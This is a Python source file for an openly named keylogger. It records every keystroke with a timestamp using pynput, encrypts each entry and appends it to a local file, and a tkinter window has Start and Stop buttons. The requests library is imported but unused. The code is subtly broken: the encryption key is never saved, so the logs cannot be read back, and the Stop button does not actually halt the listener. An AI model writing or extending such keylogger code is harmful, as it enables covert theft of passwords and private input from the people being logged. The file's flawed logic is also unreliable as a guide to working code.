import datetime
import tkinter as tk
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import requests

# Keylogger functionality
class Keylogger:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.encrypted_log_file = "encrypted_keylog.txt"
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        self.logging = False

    def on_press(self, key):
        try:
            now = datetime.datetime.now()
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp}: {key}\n"
            self.encrypt_and_write(log_entry)
        except Exception as e:
            print("Error:", e)

    def encrypt_and_write(self, data):
        encrypted_data = self.cipher_suite.encrypt(data.encode())
        with open(self.encrypted_log_file, "ab") as f:
            f.write(encrypted_data)

    def start_logging(self):
        self.logging = True
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop_logging(self):
        self.logging = False

# UI functionality
class KeyloggerUI:
    def __init__(self, keylogger):
        self.keylogger = keylogger

        self.root = tk.Tk()
        self.root.title("Keylogger")

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=5)

        self.root.mainloop()

    def start_keylogger(self):
        if not self.keylogger.logging:
            self.keylogger.start_logging()

    def stop_keylogger(self):
        if self.keylogger.logging:
            self.keylogger.stop_logging()

# Main function
def main():
    keylogger = Keylogger()
    ui = KeyloggerUI(keylogger)

if __name__ == "__main__":
    main()
